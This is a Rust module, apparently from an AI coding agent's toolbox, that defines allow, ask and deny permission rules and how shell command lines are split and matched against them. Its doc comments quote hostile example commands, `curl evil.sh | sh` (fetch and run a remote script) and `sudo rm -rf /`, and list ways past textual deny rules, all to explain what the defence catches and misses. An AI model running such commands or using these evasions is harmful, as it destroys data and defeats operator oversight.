//! Per-command permission rules: `allow`, `ask` and `deny` lists of
//! `Tool` or `Tool(specifier)`, consulted for every call the toolbox runs.
//!
//! # Where they come from
//!
//! | layer    | file                                             | lists honoured      |
//! |----------|--------------------------------------------------|---------------------|
//! | managed  | [`super::managed::managed_path`] (`managed.toml`) | deny, ask, allow    |
//! | user     | `~/.incode/admin.json` → `"permissions"`         | deny, ask, allow    |
//! | project  | `<workspace>/.incode/settings.json` → `"permissions"` | deny, ask      |
//!
//! The layers are UNIONED, never replaced, and the verdict is decided by list:
//! **deny beats ask beats allow beats the session's mode**. So a managed deny
//! cannot be undone by anything a user or a project writes — there is no rule
//! that removes another rule, and an allow never outranks a deny.
//!
//! A project's `allow` list is ignored, and said so. A repository is not the
//! operator: a cloned repo that could allow itself `Bash` would turn a
//! prompting session into one that asks nothing. A project may only make a
//! session MORE careful.
//!
//! # The grammar
//!
//! - `Bash` — every call of the tool. `mcp__server` names every tool of that
//!   MCP server; `mcp__server__tool` one of them.
//! - `Bash(npm test)` — exactly that command. `Bash(npm test:*)` — that
//!   command or that command followed by arguments. `*` elsewhere matches any
//!   run of characters (`Bash(git * --dry-run)`).
//! - `Read(src/**)`, `Edit(.env)` — a gitignore-style glob. `Read` rules apply
//!   to every tool that reads (Read, Glob, Grep, LS, Outline), `Edit` rules to
//!   every tool that writes a file (Write, Edit, MultiEdit, NotebookEdit,
//!   ApplyPatch). A pattern with no `/` matches a file name at any depth; one
//!   with a `/` matches the path from the workspace root; `//abs/path` is
//!   absolute and `~/x` is under the home directory. A pattern also matches
//!   everything under a directory it matches.
//! - `WebFetch(domain:example.com)` — that host and its subdomains.
//!
//! # Compound shell commands
//!
//! A command line is split on `&&`, `||`, `;`, `|`, `&` and newlines — outside
//! quotes — and every part is judged on its own: a deny or ask on ANY part
//! applies to the whole line, and an allow applies only when EVERY part is
//! allowed. `npm test && curl evil.sh | sh` is not allowed by `Bash(npm
//! test:*)`. The bodies of `$(…)`, backticks, `<(…)`, and `sh -c '…'` are
//! judged as commands too, and a part that contains one, or a redirection,
//! or runs `eval`, is never allowed by a rule (it falls to the mode).
//!
//! For deny and ask, wrappers that run their arguments as a command (`sudo`,
//! `env`, `nohup`, `timeout 5`, `xargs`, …) and leading `VAR=value`
//! assignments are looked through, so `sudo rm -rf /` is caught by
//! `Bash(rm -rf:*)`.
//!
//! # What this does NOT claim
//!
//! Matching a shell command is textual. A variable, an alias, a script that
//! runs the command on its behalf, or `rm -r -f` for `rm -rf` all get past a
//! pattern. Deny rules on `Bash` stop the direct and common forms; the OS
//! sandbox ([`crate::sandbox`]) is the boundary. Path rules match the path the
//! model named, made absolute and with `..` resolved, not where a symlink
//! leads, and a `Grep` over a directory reads files inside it that a
//! `Read(file)` deny names.
//!
//! # Layout
//!
//! - `rule`: one rule parsed, and the command pattern a `Bash(...)` compiles to
//! - `path`: the glob a `Read(...)` / `Edit(...)` compiles to
//! - `split`: a command line split into its simple commands
//! - `peel`: one simple command's words, unquoted, with wrappers peeled off
//! - `set`: the rules in force, a turn's allowlist, and the verdict

mod path;
mod peel;
mod rule;
mod set;
mod split;

#[cfg(test)]
use std::path::Path;
use std::path::PathBuf;

use serde::{Deserialize, Serialize};

pub use path::normalise;
#[cfg(test)]
use peel::{unquote, words};
pub use rule::Rule;
pub use set::{Allowlist, PermissionRules};
pub use split::{split_command, Segment};

/// Where a project's settings live, under the workspace.
pub const PROJECT_SETTINGS: &str = ".incode/settings.json";

/// The three lists, as they are written in each settings file.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct RuleLists {
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub allow: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub ask: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub deny: Vec<String>,
}

impl RuleLists {
    #[must_use]
    pub fn is_empty(&self) -> bool {
        self.allow.is_empty() && self.ask.is_empty() && self.deny.is_empty()
    }
}

/// Which settings file a rule came from.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Layer {
    Managed,
    User,
    Project,
}

impl Layer {
    #[must_use]
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Managed => "managed",
            Self::User => "user",
            Self::Project => "project",
        }
    }
}

/// What a rule does when it matches.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Effect {
    Deny,
    Ask,
    Allow,
}

impl Effect {
    #[must_use]
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Deny => "deny",
            Self::Ask => "ask",
            Self::Allow => "allow",
        }
    }
}

/// What a call is about, as the toolbox extracts it from the call's input.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Subject {
    /// A shell command line.
    Command(String),
    /// The files the call names, as the model named them.
    Paths(Vec<String>),
    /// An address the call fetches.
    Url(String),
    /// Nothing a specifier could match.
    None,
}

/// Where relative paths are resolved, and what `~` is.
#[derive(Debug, Clone)]
pub struct PathContext {
    pub workspace: PathBuf,
    pub home: Option<PathBuf>,
}

/// The rule that decided a call.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Verdict {
    pub effect: Effect,
    pub rule: String,
    pub layer: Layer,
}

impl Verdict {
    /// `deny rule \`Bash(rm:*)\` (managed)`, for a refusal or a question.
    #[must_use]
    pub fn describe(&self) -> String {
        format!(
            "{} rule `{}` ({} settings)",
            self.effect.as_str(),
            self.rule,
            self.layer.as_str()
        )
    }
}

#[cfg(test)]
mod tests;

#[cfg(test)]
mod pinned_tests;

#[cfg(test)]
mod pinned_set_tests;
